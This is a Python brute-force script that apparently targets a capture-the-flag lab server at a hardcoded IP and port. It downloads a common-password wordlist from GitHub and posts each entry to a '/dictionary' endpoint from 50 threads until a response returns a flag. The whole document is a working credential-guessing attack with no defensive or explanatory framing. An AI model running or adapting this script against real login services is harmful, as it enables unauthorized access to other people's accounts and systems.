import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

ip = "94.237.122.124"  # Target IP
port = 36093           # Target port

def get_password_list():
    try:
        response = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/500-worst-passwords.txt", timeout=5)
        response.raise_for_status()
        return response.text.splitlines()
    except requests.RequestException as e:
        print(f"Error fetching password list: {e}")
        return []

def try_password(password):
    try:
        response = requests.post(
            f"http://{ip}:{port}/dictionary",
            data={'password': password},
            timeout=3
        )
        if response.ok and 'flag' in response.json():
            return password, response.json()['flag']
    except (requests.RequestException, ValueError) as e:
        pass  # Skip errors
    return None

def brute_force():
    passwords = get_password_list()
    if not passwords:
        print("Failed to load password list")
        return

    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(try_password, password) for password in passwords]
        
        for future in as_completed(futures):
            result = future.result()
            if result:
                password, flag = result
                print(f"\n[+] Correct password found: {password}")
                print(f"[+] Flag: {flag}")
                executor.shutdown(wait=False)
                return

    print("[-] Password not found in the list")

if __name__ == "__main__":
    print("Starting brute-force attack...")
    brute_force()
